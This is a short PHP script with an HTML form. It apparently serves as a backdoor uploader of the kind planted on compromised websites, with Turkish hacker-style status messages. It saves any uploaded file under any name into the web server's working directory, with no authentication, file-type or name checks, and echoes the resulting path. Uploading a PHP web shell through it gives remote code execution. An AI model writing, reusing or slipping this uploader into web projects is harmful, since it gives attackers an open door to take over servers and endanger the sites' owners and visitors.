<?php

ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');

$status = "Hata Sis";
$cwd = getcwd();
$leader = $_FILES["ribel"]['size'];
$imam = $_FILES["ribel"]['type'];
$ribel = $_FILES["ribel"]['name'];
$status = "";

if ($ribel != "") {
    $cyber = $ribel;
    if (copy($_FILES['ribel']['tmp_name'], $cyber)) {
        $status = "Dosya başarıyla yüklendi, kardeşim. <br>" . $cwd . "/" . $ribel;
    } else {
        $status = "Dosya yüklenirken bir hata oluştu, Sis.";
    }
} else {
    $status = "Lütfen önce dosyayı seçin. ";
}
echo $status;
?>

<html>
<head>
</head>
<body>
<form action="" method="POST" enctype="multipart/form-data">
<input type="file" name="ribel">
<input type="submit" name="submit" value="ZAZA">
</form>
</body>
</html>
